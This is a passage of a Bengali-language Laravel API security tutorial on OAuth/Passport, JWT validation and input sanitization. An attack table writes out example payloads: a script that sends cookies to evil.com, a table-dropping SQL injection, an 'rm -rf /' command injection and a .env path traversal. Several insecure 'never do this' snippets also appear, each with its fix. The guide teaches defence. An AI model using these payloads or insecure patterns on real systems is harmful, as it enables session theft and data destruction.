- 🔌 **Revocation** — user যেকোনো সময় app এর access বাতিল করতে পারে
- 🌐 **Standard Protocol** — সব ভাষার SDK এতে কাজ করে, নিজে বানাতে হয় না

### Laravel Best Practice

#### 🤔 Passport না Sanctum? — আগে সিদ্ধান্ত নিন

| প্রয়োজন | ব্যবহার করুন |
|---------|--------------|
| নিজের mobile app / নিজের SPA | ✅ **Sanctum** (সহজ, হালকা) |
| Third-party developer রা আপনার API ব্যবহার করবে | ✅ **Passport** (full OAuth 2.0) |
| "Login with MyApp" feature দিতে চান | ✅ **Passport** |
| Server-to-server (কোনো user নেই) | ✅ **Passport Client Credentials** অথবা [API Key](#2-api-keys) |
| শুধু simple token লাগবে | ✅ **Sanctum** |

> 💡 **সবচেয়ে সাধারণ ভুল:** নিজের mobile app এর জন্য Passport সেটআপ করা। এটা অপ্রয়োজনীয় জটিলতা। নিজের app এর জন্য **Sanctum** ই যথেষ্ট। OAuth 2.0 তখনই দরকার যখন **অন্য কেউ** আপনার API এর উপর app বানাবে।

#### ধাপ ১: Passport Install

```bash
composer require laravel/passport

php artisan migrate

# Encryption key + default clients তৈরি করে
php artisan passport:install
```

#### ধাপ ২: Configuration

```php
<?php
// app/Models/User.php

namespace App\Models;

use Illuminate\Foundation\Auth\User as Authenticatable;
use Laravel\Passport\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens;   // ← এটা যোগ করুন

    protected $fillable = ['name', 'email', 'password'];
    protected $hidden   = ['password', 'remember_token'];
}
```

```php
<?php
// config/auth.php

'guards' => [
    'web' => [
        'driver'   => 'session',
        'provider' => 'users',
    ],

    'api' => [
        'driver'   => 'passport',   // ← passport driver
        'provider' => 'users',
    ],
],
```

```php
<?php
// app/Providers/AppServiceProvider.php

use Laravel\Passport\Passport;

public function boot(): void
{
    // Token এর মেয়াদ - যত ছোট, তত নিরাপদ
    Passport::tokensExpireIn(now()->addDays(15));
    Passport::refreshTokensExpireIn(now()->addDays(30));
    Passport::personalAccessTokensExpireIn(now()->addMonths(6));

    // Scope গুলো এখানে define করুন
    Passport::tokensCan([
        'profile:read'  => 'Profile তথ্য পড়তে পারবে',
        'profile:write' => 'Profile তথ্য পরিবর্তন করতে পারবে',
        'orders:read'   => 'Order list দেখতে পারবে',
        'orders:write'  => 'নতুন Order তৈরি করতে পারবে',
        'admin'         => 'সব কিছুর access',
    ]);

    // কোনো scope না চাইলে default কি দেওয়া হবে
    Passport::setDefaultScope(['profile:read']);
}
```

#### ধাপ ৩: Client তৈরি করা

```bash
# Authorization Code Grant (third-party web app এর জন্য)
php artisan passport:client
# → Client ID এবং Client Secret পাবেন

# Client Credentials Grant (server-to-server, কোনো user নেই)
php artisan passport:client --client

# Password Grant (শুধু নিজের first-party app, নতুন প্রজেক্টে avoid করুন)
php artisan passport:client --password
```

#### ধাপ ৪: Route এ Scope দিয়ে Protect করা

```php
<?php
// routes/api.php

Route::middleware('auth:api')->group(function () {

    // যেকোনো valid token চলবে
    Route::get('/user', fn (Request $request) => $request->user());

    // scopes → সব scope থাকতে হবে (AND)
    Route::get('/orders', [OrderController::class, 'index'])
        ->middleware('scopes:orders:read');

    Route::post('/orders', [OrderController::class, 'store'])
        ->middleware('scopes:orders:read,orders:write');

    // scope → যেকোনো একটা থাকলেই হবে (OR)
    Route::get('/reports', [ReportController::class, 'index'])
        ->middleware('scope:admin,orders:read');
});
```

**Middleware register** (Laravel 11/12 — `bootstrap/app.php`):

```php
$middleware->alias([
    'scopes' => \Laravel\Passport\Http\Middleware\CheckScopes::class,
    'scope'  => \Laravel\Passport\Http\Middleware\CheckForAnyScope::class,
]);
```

#### ধাপ ৫: Controller এ Scope Check

```php
<?php
// app/Http/Controllers/Api/OrderController.php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Order;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class OrderController extends Controller
{
    public function index(Request $request): JsonResponse
    {
        // Token এ scope আছে কিনা check
        if (! $request->user()->tokenCan('orders:read')) {
            return response()->json(['message' => 'Missing scope: orders:read'], 403);
        }

        return response()->json(
            Order::where('user_id', $request->user()->id)->paginate(20)
        );
    }

    public function destroy(Request $request, Order $order): JsonResponse
    {
        // Scope = "app কি এই কাজ করতে পারবে?"
        if (! $request->user()->tokenCan('orders:write')) {
            return response()->json(['message' => 'Missing scope: orders:write'], 403);
        }

        // Policy = "এই user কি এই নির্দিষ্ট order মুছতে পারবে?"
        $this->authorize('delete', $order);

        $order->delete();

        return response()->json(['message' => 'Order deleted']);
    }
}
```

> 💡 **Scope আর Policy একসাথে লাগে, একটা আরেকটার বিকল্প নয়।**
> - **Scope** = *App* কে user কতটুকু অনুমতি দিয়েছে
> - **Policy** = *User* নিজে এই কাজ করার অধিকার রাখে কিনা
>
> Policy সম্পর্কে বিস্তারিত: [authorization-bangla-guide.md](../authorization-bangla-guide.md) এবং [laravel-policy-bangla-guide.md](../laravel-policy-bangla-guide.md)

#### ধাপ ৬: Client Credentials Grant (Server-to-Server)

যেখানে কোনো user নেই — শুধু একটা server আরেকটা server কে কল করছে:

```php
<?php
// routes/api.php

Route::middleware('client')->group(function () {
    Route::post('/internal/sync-inventory', [InventoryController::class, 'sync']);
});
```

```php
// bootstrap/app.php
$middleware->alias([
    'client' => \Laravel\Passport\Http\Middleware\CheckClientCredentials::class,
]);
```

Client side (Guzzle দিয়ে token নেওয়া):

```php
<?php

use Illuminate\Support\Facades\Http;

$response = Http::asForm()->post('https://api.myshop.com/oauth/token', [
    'grant_type'    => 'client_credentials',
    'client_id'     => config('services.myshop.client_id'),
    'client_secret' => config('services.myshop.client_secret'),
    'scope'         => 'inventory:write',
]);

$accessToken = $response->json('access_token');

$orders = Http::withToken($accessToken)
    ->get('https://api.myshop.com/api/internal/sync-inventory');
```

#### 🚫 কোন Grant Type ব্যবহার করবেন না

| Grant Type | অবস্থা | কারণ |
|------------|--------|------|
| **Authorization Code + PKCE** | ✅ ব্যবহার করুন | Web ও mobile — সবচেয়ে নিরাপদ |
| **Client Credentials** | ✅ ব্যবহার করুন | Server-to-server এর জন্য সঠিক |
| **Refresh Token** | ✅ ব্যবহার করুন | Short-lived access token সম্ভব হয় |
| **Password Grant** | ⚠️ এড়িয়ে চলুন | User password app কে দিতে হয় — OAuth এর মূল উদ্দেশ্যই নষ্ট |
| **Implicit Grant** | ❌ কখনো না | Token URL এ যায়, browser history তে থেকে যায় — deprecated |

#### 🔒 OAuth Security Rules

- ✅ **HTTPS বাধ্যতামূলক** — OAuth এর কোনো নিরাপত্তাই HTTP তে নেই
- ✅ **`redirect_uri` exact match** করুন, wildcard দেবেন না
- ✅ **PKCE ব্যবহার করুন** mobile/SPA এর জন্য (`--public` client)
- ✅ **Access token ছোট মেয়াদের** রাখুন, refresh token দিয়ে নবায়ন করুন
- ✅ **Client secret কখনো** mobile app বা JavaScript এ রাখবেন না
- ✅ **`state` parameter** ব্যবহার করুন — CSRF প্রতিরোধ করে

```bash
# Expired token গুলো নিয়মিত পরিষ্কার করুন (schedule করুন)
php artisan passport:purge
```

---

## 4. JWT Validation

### What is a JWT?

**JWT (JSON Web Token)** হলো একটা self-contained token — token এর ভেতরেই user এর তথ্য লেখা থাকে, তাই server কে প্রতিবার database এ query করতে হয় না।

একটা JWT দেখতে এমন — তিনটা অংশ, ডট (`.`) দিয়ে আলাদা:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJzdWIiOiIxMjMiLCJleHAiOjE3MDAwMDB9 . SflKxwRJSMeKKF2QT4f
└──────── Header ────────┘   └──────── Payload ────────┘   └──── Signature ────┘
```

| অংশ | কি থাকে | গোপন? |
|-----|---------|-------|
| **Header** | `{"alg": "RS256", "typ": "JWT"}` — কোন algorithm | ❌ না, base64 encoded মাত্র |
| **Payload (Claims)** | `{"sub": "123", "exp": 1700000, "iss": "auth.myapp.com"}` | ❌ **না! যে কেউ পড়তে পারে** |
| **Signature** | Header + Payload এর cryptographic signature | ✅ এটাই আসল নিরাপত্তা |

> ⚠️ **সবচেয়ে বড় ভুল ধারণা:** JWT **encrypted নয়**, শুধু **encoded**। যে কেউ [jwt.io](https://jwt.io) তে পেস্ট করে payload পড়তে পারবে।
> **তাই JWT payload এ কখনো password, credit card number, বা কোনো sensitive data রাখবেন না।**
> Signature শুধু নিশ্চিত করে যে token টা **পরিবর্তন করা হয়নি** — লুকানো নয়।

#### 📌 Standard Claims — যেগুলো অবশ্যই যাচাই করতে হবে

| Claim | পূর্ণরূপ | কেন যাচাই করবেন |
|-------|---------|------------------|
| `exp` | Expiration Time | মেয়াদ শেষ token গ্রহণ করা যাবে না |
| `nbf` | Not Before | এই সময়ের আগে token বৈধ নয় |
| `iat` | Issued At | কখন তৈরি হয়েছে |
| `iss` | Issuer | **কে** token দিয়েছে — অন্য কারো token চলবে না |
| `aud` | Audience | token টা **কার জন্য** — অন্য service এর token চলবে না |
| `sub` | Subject | কোন user |

### Why do we need it?

- 🔍 **জাল token ধরা** — Signature verify না করলে যে কেউ নিজে token বানিয়ে admin সেজে ঢুকে যাবে
- ⏰ **Expired token আটকানো** — `exp` চেক না করলে পুরোনো চুরি করা token চিরকাল কাজ করবে
- 🎭 **Algorithm Confusion Attack প্রতিরোধ** — attacker `"alg": "none"` দিয়ে signature ছাড়া token পাঠাতে পারে
- 🏢 **Cross-service token misuse ঠেকানো** — `aud` চেক না করলে অন্য service এর token আপনার API তে চলে যাবে
- ⚡ **Stateless & Fast** — microservice architecture এ প্রতিটা service নিজেই token verify করতে পারে

#### 💣 বাস্তব Attack উদাহরণ

```php
// ❌ ভয়ঙ্কর ভুল — শুধু decode, verify নেই
$payload = json_decode(base64_decode(explode('.', $token)[1]), true);
$user = User::find($payload['sub']);   // Attacker যা খুশি sub দিতে পারে!
```

Attacker শুধু payload এ `{"sub": 1, "role": "admin"}` লিখে দিলেই admin হয়ে যাবে। **Decode ≠ Verify।**

### Laravel Best Practice

#### 🤔 কখন JWT লাগবে?

| পরিস্থিতি | সমাধান |
|-----------|--------|
| নিজের Laravel API + নিজের app | ✅ **Sanctum** (JWT দরকার নেই) |
| Microservices — একাধিক service একই token verify করবে | ✅ **JWT** |
| External Identity Provider (Auth0, Keycloak, Cognito, Firebase) | ✅ **JWT validation** |
| Third-party developer platform | ✅ **Passport / OAuth 2.0** |

> 💡 **JWT সবসময় ভালো নয়।** JWT এর সবচেয়ে বড় দুর্বলতা — **সহজে revoke করা যায় না**। Token চুরি হলে `exp` না আসা পর্যন্ত সেটা কাজ করতেই থাকবে। Sanctum এ token DB তে থাকে, তাই সাথে সাথে delete করা যায়। প্রয়োজন না হলে JWT ব্যবহার করবেন না।

#### ধাপ ১: Package Install

```bash
composer require firebase/php-jwt
```

#### ধাপ ২: Configuration

```php
<?php
// config/jwt.php

return [
    // RS256 (asymmetric) সবচেয়ে ভালো: public key দিয়ে শুধু verify করা যায়, sign করা যায় না
    'algorithm'    => env('JWT_ALGORITHM', 'RS256'),

    'public_key'   => env('JWT_PUBLIC_KEY_PATH', storage_path('keys/jwt-public.pem')),
    'private_key'  => env('JWT_PRIVATE_KEY_PATH', storage_path('keys/jwt-private.pem')),

    // HS256 ব্যবহার করলে এই secret লাগবে (সব service এ একই secret share করতে হয় - কম নিরাপদ)
    'secret'       => env('JWT_SECRET'),

    // যাচাই করার জন্য
    'issuer'       => env('JWT_ISSUER', 'https://auth.myapp.com'),
    'audience'     => env('JWT_AUDIENCE', 'https://api.myapp.com'),
    'leeway'       => 60,   // clock skew - সার্ভারের ঘড়ির সামান্য পার্থক্য মেনে নেওয়া হবে

    'jwks_url'     => env('JWT_JWKS_URL'),        // External IdP এর key endpoint
    'jwks_cache_ttl' => 3600,
];
```

```env
JWT_ALGORITHM=RS256
JWT_ISSUER=https://auth.myapp.com
JWT_AUDIENCE=https://api.myapp.com
JWT_JWKS_URL=https://auth.myapp.com/.well-known/jwks.json
```

#### ধাপ ৩: JWT Validator Service

```php
<?php
// app/Services/JwtValidator.php

namespace App\Services;

use DomainException;
use Firebase\JWT\JWK;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;
use Firebase\JWT\ExpiredException;
use Firebase\JWT\SignatureInvalidException;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use UnexpectedValueException;

class JwtValidator
{
    /**
     * Token verify করে payload ফেরত দেয়।
     *
     * @throws \RuntimeException যদি token invalid হয়
     */
    public function validate(string $token): array
    {
        JWT::$leeway = (int) config('jwt.leeway');

        try {
            // ⚠️ গুরুত্বপূর্ণ: algorithm আমরা নিজে ঠিক করে দিচ্ছি।
            // token এর header থেকে alg পড়া হচ্ছে না → "alg: none" attack বন্ধ।
            $decoded = JWT::decode($token, $this->key());
        } catch (ExpiredException $e) {
            throw new \RuntimeException('Token expired.', 401, $e);
        } catch (SignatureInvalidException $e) {
            throw new \RuntimeException('Invalid token signature.', 401, $e);
        } catch (DomainException|UnexpectedValueException $e) {
            throw new \RuntimeException('Malformed token.', 401, $e);
        }

        $payload = (array) $decoded;

        $this->assertIssuer($payload);
        $this->assertAudience($payload);
        $this->assertNotRevoked($payload);

        return $payload;
    }

    /** Signing key — JWKS থেকে অথবা local file থেকে */
    protected function key(): Key|array
    {
        if ($url = config('jwt.jwks_url')) {
            $jwks = Cache::remember('jwt:jwks', config('jwt.jwks_cache_ttl'), function () use ($url) {
                return Http::timeout(5)->get($url)->throw()->json();
            });

            return JWK::parseKeySet($jwks);   // kid অনুযায়ী সঠিক key নিজেই খুঁজে নেয়
        }

        $algorithm = config('jwt.algorithm');

        $material = $algorithm === 'HS256'
            ? config('jwt.secret')
            : file_get_contents(config('jwt.public_key'));

        return new Key($material, $algorithm);
    }

    protected function assertIssuer(array $payload): void
    {
        if (($payload['iss'] ?? null) !== config('jwt.issuer')) {
            throw new \RuntimeException('Invalid token issuer.', 401);
        }
    }

    protected function assertAudience(array $payload): void
    {
        $aud      = (array) ($payload['aud'] ?? []);
        $expected = config('jwt.audience');

        if (! in_array($expected, $aud, true)) {
            throw new \RuntimeException('Token audience mismatch.', 401);
        }
    }

    /** Logout করা token গুলোর জন্য denylist (jti = token এর unique id) */
    protected function assertNotRevoked(array $payload): void
    {
        $jti = $payload['jti'] ?? null;

        if ($jti && Cache::has('jwt:revoked:' . $jti)) {
            throw new \RuntimeException('Token has been revoked.', 401);
        }
    }

    /** Logout এর সময় কল করুন */
    public function revoke(array $payload): void
    {
        if ($jti = $payload['jti'] ?? null) {
            $ttl = max(1, ($payload['exp'] ?? time()) - time());

            Cache::put('jwt:revoked:' . $jti, true, $ttl);
        }
    }
}
```

#### ধাপ ৪: Middleware

```php
<?php
// app/Http/Middleware/ValidateJwt.php

namespace App\Http\Middleware;

use App\Models\User;
use App\Services\JwtValidator;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class ValidateJwt
{
    public function __construct(protected JwtValidator $validator) {}

    /**
     * Usage: ->middleware('jwt:orders:read')
     */
    public function handle(Request $request, Closure $next, ?string $scope = null): Response
    {
        $token = $request->bearerToken();

        if (blank($token)) {
            return response()->json(['message' => 'Bearer token required.'], 401);
        }

        try {
            $payload = $this->validator->validate($token);
        } catch (\RuntimeException $e) {
            Log::channel('security')->warning('JWT validation failed', [
                'reason' => $e->getMessage(),
                'ip'     => $request->ip(),
                'path'   => $request->path(),
            ]);

            return response()->json(['message' => $e->getMessage()], 401);
        }

        // Scope check
        if ($scope) {
            $scopes = explode(' ', (string) ($payload['scope'] ?? ''));

            if (! in_array($scope, $scopes, true)) {
                return response()->json(['message' => "Missing scope: {$scope}"], 403);
            }
        }

        // Local user এর সাথে যোগ করা (external IdP হলে first-login এ তৈরি হবে)
        $user = User::firstOrCreate(
            ['external_id' => $payload['sub']],
            [
                'name'  => $payload['name']  ?? 'Unknown',
                'email' => $payload['email'] ?? $payload['sub'] . '@no-email.local',
            ]
        );

        Auth::setUser($user);
        $request->attributes->set('jwt_payload', $payload);

        return $next($request);
    }
}
```

#### ধাপ ৫: Route এ ব্যবহার

```php
<?php
// routes/api.php

Route::middleware(['jwt', 'throttle:api'])->prefix('v1')->group(function () {
    Route::get('/me', fn (Request $request) => $request->user());

    Route::get('/orders', [OrderController::class, 'index'])->middleware('jwt:orders:read');
    Route::post('/orders', [OrderController::class, 'store'])->middleware('jwt:orders:write');
});
```

#### ✅ JWT Validation Checklist

প্রতিটা JWT verify করার সময় এই ৭টা জিনিস অবশ্যই চেক করতে হবে:

| # | চেক | না করলে কি হবে |
|---|-----|----------------|
| 1 | **Signature verify** | যে কেউ নিজে token বানিয়ে admin হয়ে যাবে |
| 2 | **Algorithm নিজে fix করা** (`RS256`) | `alg: none` attack — signature ছাড়াই token চলবে |
| 3 | **`exp` (expiry)** | চুরি করা পুরোনো token চিরকাল কাজ করবে |
| 4 | **`nbf` / `iat`** | ভবিষ্যতের তারিখের token গ্রহণ হবে |
| 5 | **`iss` (issuer)** | অন্য কোনো IdP এর token গ্রহণ হবে |
| 6 | **`aud` (audience)** | অন্য service এর token আপনার API তে চলবে |
| 7 | **Revocation (`jti` denylist)** | Logout করা token তবুও কাজ করবে |

#### ❌ যা কখনো করবেন না

```php
// ❌ Header থেকে algorithm নেওয়া — সবচেয়ে বিপজ্জনক ভুল
$header = json_decode(base64_decode(explode('.', $token)[0]));
JWT::decode($token, new Key($key, $header->alg));   // attacker alg নিয়ন্ত্রণ করছে!

// ❌ Verify ছাড়া decode
$payload = json_decode(base64_decode(explode('.', $token)[1]));

// ❌ Payload এ sensitive data
$payload = ['sub' => 1, 'password' => 'secret', 'card' => '4111...'];   // সবাই পড়তে পারবে

// ❌ দুর্বল secret
JWT_SECRET=secret123

// ✅ সঠিক - algorithm আমরা fix করছি, key config থেকে আসছে
JWT::decode($token, new Key(file_get_contents(config('jwt.public_key')), 'RS256'));
```

> 🔐 **RS256 কেন HS256 এর চেয়ে ভালো?**
> **HS256** এ একটাই secret — যে verify করে, সে sign ও করতে পারে। ৫টা microservice এ secret share করলে যেকোনো একটা compromise হলেই সব শেষ।
> **RS256** এ private key দিয়ে sign, public key দিয়ে verify। Service গুলোকে শুধু **public key** দিন — তারা verify করতে পারবে কিন্তু জাল token বানাতে পারবে না।

---

## 5. Input Sanitization

### What is Input Sanitization?

**Input Sanitization** মানে — বাইরে থেকে আসা প্রতিটা data কে **শত্রু ধরে নিয়ে** যাচাই ও পরিষ্কার করা, তারপর ব্যবহার করা।

#### 🔑 মূল নীতি

> **"Never trust user input."** — user থেকে আসা কোনো data ই বিশ্বাসযোগ্য নয়।

শুধু form field না — এই সবকিছুই user input:

- Request body (JSON/form)
- Query string (`?search=...`)
- Route parameter (`/users/{id}`)
- **HTTP Headers** (`User-Agent`, `Referer`, `X-Forwarded-For`)
- **Cookies**
- **File upload** (নাম, content, MIME type)
- **Webhook payload** — অন্য server থেকে আসছে বলেই নিরাপদ নয়

#### 🍳 Analogy

বাজার থেকে সবজি এনে সরাসরি রান্না করেন না — **ধুয়ে, বেছে, কেটে** তারপর রান্না করেন। Input sanitization হলো data এর "ধোয়া-বাছা"।

#### Validation vs Sanitization — পার্থক্য

| | Validation | Sanitization |
|--|-----------|--------------|
| কাজ | **যাচাই** করে — সঠিক না হলে reject | **পরিষ্কার** করে — বিপজ্জনক অংশ সরায় |
| উদাহরণ | "email কি valid?" → না হলে 422 | `<script>` tag সরিয়ে দেওয়া |
| Laravel | `FormRequest`, `$request->validate()` | Middleware, Casting, `strip_tags()` |

**দুটোই লাগবে।** Validation প্রথমে, Sanitization এর পরে।

### Why do we need it?

| Attack | কিভাবে হয় | ফলাফল |
|--------|-----------|--------|
| 💉 **SQL Injection** | `'; DROP TABLE users; --` | পুরো database মুছে যেতে পারে / চুরি হতে পারে |
| 🕷️ **XSS (Cross-Site Scripting)** | `<script>fetch('evil.com?c='+document.cookie)</script>` | User এর session চুরি |
| 📦 **Mass Assignment** | `{"name":"X", "is_admin":true}` | সাধারণ user নিজেকে admin বানিয়ে ফেলে |
| 📁 **Path Traversal** | `../../.env` | Server এর গোপন file পড়ে ফেলা |
| 🐚 **Command Injection** | `file.jpg; rm -rf /` | Server এ যেকোনো command চালানো |
| 📄 **Malicious File Upload** | `shell.php` কে `photo.jpg` নাম দিয়ে upload | Server পুরো দখল |

### Laravel Best Practice

#### Layer 1: FormRequest দিয়ে Validation (সবচেয়ে গুরুত্বপূর্ণ)

Controller এ validation না লিখে আলাদা `FormRequest` class বানান — পরিষ্কার, reusable, testable।

```bash
php artisan make:request StorePostRequest
```

```php
<?php
// app/Http/Requests/StorePostRequest.php

namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;

class StorePostRequest extends FormRequest
{
    public function authorize(): bool
    {
        // Authorization এখানেই - Policy কল করা যায়
        return $this->user()->can('create', \App\Models\Post::class);
    }

    public function rules(): array
    {
        return [
            'title' => ['required', 'string', 'min:3', 'max:200'],

            'slug'  => [
                'required', 'string', 'max:220',
                'regex:/^[a-z0-9-]+$/',                  // শুধু নির্দিষ্ট character
                Rule::unique('posts', 'slug'),
            ],

            'body'  => ['required', 'string', 'max:50000'],

            // ✅ whitelist — অন্য কোনো মান গ্রহণ হবে না
            'status' => ['required', Rule::in(['draft', 'published', 'archived'])],

            'category_id' => ['required', 'integer', Rule::exists('categories', 'id')],

            'tags'   => ['sometimes', 'array', 'max:10'],
            'tags.*' => ['string', 'max:30', 'alpha_dash'],

            // File upload - কড়াভাবে যাচাই
            'cover' => [
                'nullable',
                'file',
                'image',                            // আসল image কিনা content দেখে বোঝে
                'mimes:jpg,jpeg,png,webp',
                'max:2048',                         // KB (2 MB)
                'dimensions:max_width=4000,max_height=4000',
            ],

            'published_at' => ['nullable', 'date', 'after_or_equal:today'],
        ];
    }

    /**
     * Validation চলার আগেই data পরিষ্কার করে নেওয়া
     */
    protected function prepareForValidation(): void
    {
        $this->merge([
            'title' => trim((string) $this->input('title')),
            'slug'  => \Str::slug((string) ($this->input('slug') ?: $this->input('title'))),
            'email' => strtolower(trim((string) $this->input('email'))),
        ]);
    }

    public function messages(): array
    {
        return [
            'title.required' => 'Title অবশ্যই দিতে হবে।',
            'slug.regex'     => 'Slug এ শুধু ছোট হাতের অক্ষর, সংখ্যা এবং hyphen ব্যবহার করা যাবে।',
            'cover.max'      => 'ছবির সাইজ ২ MB এর বেশি হতে পারবে না।',
        ];
    }
}
```

**Controller এ ব্যবহার:**

```php
<?php
// app/Http/Controllers/Api/PostController.php

class PostController extends Controller
{
    public function store(StorePostRequest $request): JsonResponse
    {
        // এই লাইনে পৌঁছানো মানেই data ইতিমধ্যে validated + authorized
        // ✅ validated() — শুধু rules() এ থাকা field গুলো আসবে, অতিরিক্ত কিছু না
        $post = $request->user()->posts()->create($request->validated());

        return response()->json(new PostResource($post), 201);
    }
}
```

> ⚠️ **`$request->all()` কখনো `create()` বা `update()` এ পাঠাবেন না।**
> `all()` এ user এর পাঠানো **সব** field থাকে — `is_admin`, `balance`, `user_id` সহ।
> সবসময় **`validated()`** বা **`safe()->only([...])`** ব্যবহার করুন।

#### Layer 2: Mass Assignment Protection

```php
<?php
// app/Models/Post.php

class Post extends Model
{
    // ✅ সঠিক - শুধু এই field গুলোই mass assign হবে (whitelist)
    protected $fillable = ['title', 'slug', 'body', 'status', 'category_id'];

    // ❌ বিপজ্জনক - নতুন column যোগ হলেই সেটা অরক্ষিত হয়ে যাবে
    // protected $guarded = [];

    protected $casts = [
        'published_at' => 'datetime',
        'is_featured'  => 'boolean',
        'meta'         => 'array',
    ];
}
```

**কেন `$guarded = []` বিপজ্জনক?** ৬ মাস পর কেউ `is_admin` column যোগ করলো। এখন attacker `{"name":"X","is_admin":true}` পাঠালেই admin হয়ে যাবে। `$fillable` ব্যবহার করলে এই সমস্যা কখনোই হবে না।

#### Layer 3: Global Sanitization Middleware

Validation এর পাশাপাশি একটা middleware দিয়ে সব string থেকে বিপজ্জনক character সরিয়ে ফেলা যায়।

```php
<?php
// app/Http/Middleware/SanitizeInput.php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SanitizeInput
{
    /** এই field গুলো ছোঁয়া হবে না */
    protected array $except = [
        'password',
        'password_confirmation',
        'current_password',
        'token',
        'signature',
        'body_html',      // Rich text editor এর content - আলাদাভাবে purify করতে হবে
    ];

    public function handle(Request $request, Closure $next): Response
    {
        $input = $request->all();

        array_walk_recursive($input, function (&$value, $key) {
            if (! is_string($value) || in_array($key, $this->except, true)) {
                return;
            }

            // 1) Null byte সরানো (path traversal এ ব্যবহৃত হয়)
            $value = str_replace("\0", '', $value);

            // 2) Invisible/control character সরানো
            $value = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/u', '', $value);

            // 3) HTML tag সরানো (XSS প্রতিরোধ)
            $value = strip_tags($value);

            // 4) অতিরিক্ত whitespace পরিষ্কার
            $value = trim(preg_replace('/\s+/u', ' ', $value));
        });

        $request->merge($input);

        return $next($request);
    }
}
```

**Register (Laravel 11/12 — `bootstrap/app.php`):**

```php
->withMiddleware(function (Middleware $middleware) {
    $middleware->api(append: [
        \App\Http\Middleware\SanitizeInput::class,
    ]);
})
```

> 💡 এই middleware এর একটা version ইতিমধ্যে [middleware-bangla-guide.md](../middleware-bangla-guide.md) এ আছে। এখানে null byte ও control character removal যোগ করা হয়েছে, আর `htmlspecialchars()` বাদ দেওয়া হয়েছে — **কারণ API তে encode করা উচিত output এর সময়, storage এর সময় নয়** (নাহলে database এ `&amp;quot;` জমতে থাকবে)।

#### Layer 4: SQL Injection Protection

Laravel এর Eloquent ও Query Builder **automatically prepared statement** ব্যবহার করে — তাই সাধারণ ব্যবহারে SQL injection হয় না। সমস্যা হয় যখন raw query লেখা হয়।

```php
<?php

// ❌ মারাত্মক ভুল - সরাসরি string concatenation
$users = DB::select("SELECT * FROM users WHERE email = '" . $request->email . "'");
User::whereRaw("name LIKE '%{$request->q}%'")->get();

// ✅ সঠিক - Eloquent নিজেই bind করে
User::where('email', $request->email)->first();

// ✅ সঠিক - Raw লাগলে অবশ্যই binding ব্যবহার করুন
DB::select('SELECT * FROM users WHERE email = ?', [$request->email]);
User::whereRaw('LOWER(name) LIKE ?', ['%' . strtolower($request->q) . '%'])->get();

// ✅ Named binding
DB::select('SELECT * FROM orders WHERE status = :status', ['status' => $request->status]);
```

**⚠️ Column name ও Order direction কখনো bind করা যায় না — তাই whitelist করুন:**

```php
<?php

// ❌ বিপজ্জনক - user যা খুশি column নাম পাঠাতে পারে
$users = User::orderBy($request->sort_by, $request->direction)->get();

// ✅ সঠিক - whitelist
$sortable  = ['name', 'email', 'created_at'];
$sortBy    = in_array($request->sort_by, $sortable, true) ? $request->sort_by : 'created_at';
$direction = $request->direction === 'asc' ? 'asc' : 'desc';

$users = User::orderBy($sortBy, $direction)->get();
```

#### Layer 5: XSS Protection (Output Encoding)

XSS মূলত **output** এর সমস্যা। API তে JSON response দিলে বেশিরভাগ ক্ষেত্রে নিরাপদ, কিন্তু:

```blade
{{-- ✅ নিরাপদ - Blade automatic escape করে --}}
{{ $post->title }}

{{-- ❌ বিপজ্জনক - কোনো escape হয় না --}}
{!! $post->body !!}
```

Rich text (HTML) সংরক্ষণ করতেই হলে **HTML Purifier** ব্যবহার করুন:

```bash
composer require mews/purifier
```

```php
<?php
// Controller বা Model mutator এ

use Mews\Purifier\Facades\Purifier;

class Post extends Model
{
    protected function bodyHtml(): Attribute
    {
        return Attribute::set(
            fn (string $value) => Purifier::clean($value, [
                'HTML.Allowed' => 'p,br,strong,em,u,ul,ol,li,a[href],h2,h3,blockquote,code,pre',
                'HTML.SafeIframe' => false,
                'AutoFormat.RemoveEmpty' => true,
            ])
        );
    }
}
```

#### Layer 6: File Upload Security

```php
<?php
// app/Http/Controllers/Api/UploadController.php

namespace App\Http\Controllers\Api;

use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Str;

class UploadController extends Controller
{
    public function store(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'file' => [
                'required',
                'file',
                'mimes:jpg,jpeg,png,pdf',   // extension + MIME দুটোই চেক করে
                'max:5120',                 // 5 MB
            ],
        ]);

        $file = $validated['file'];

        // ✅ user এর দেওয়া নাম কখনো ব্যবহার করবেন না ("../../../shell.php")
        $filename = Str::uuid() . '.' . $file->extension();   // extension() আসল MIME থেকে আসে

        // ✅ public folder এ নয় - private disk এ রাখুন
        $path = $file->storeAs('uploads/' . now()->format('Y/m'), $filename, 'private');

        return response()->json([
            'path' => $path,
            'url'  => route('files.show', ['path' => $path]),   // signed/authorized route দিয়ে serve করুন
        ], 201);
    }
}
```

**File upload এর নিয়ম:**

| নিয়ম | কারণ |
|------|------|
| ✅ `mimes:` দিয়ে whitelist করুন | `.php`, `.phtml`, `.svg` upload হলে server দখল হতে পারে |
| ✅ নিজে filename generate করুন (UUID) | Path traversal ও overwrite প্রতিরোধ |
| ✅ `max:` size limit দিন | Disk ভরে গিয়ে server down হওয়া ঠেকায় |
| ✅ Web root এর বাইরে store করুন | Upload করা file সরাসরি execute হতে পারবে না |
| ✅ Controller দিয়ে serve করুন | Access control প্রয়োগ করা যায় |
| ❌ `$file->getClientOriginalName()` ব্যবহার করবেন না | User এই নাম পুরোপুরি নিয়ন্ত্রণ করে |

#### 🧪 Test করা

```php
<?php
// tests/Feature/PostValidationTest.php

it('rejects XSS payload in title', function () {
    $this->actingAs(User::factory()->create())
        ->postJson('/api/posts', [
            'title'  => '<script>alert(1)</script>Hello',
            'body'   => 'Test body',
            'status' => 'draft',
        ])
        ->assertCreated();

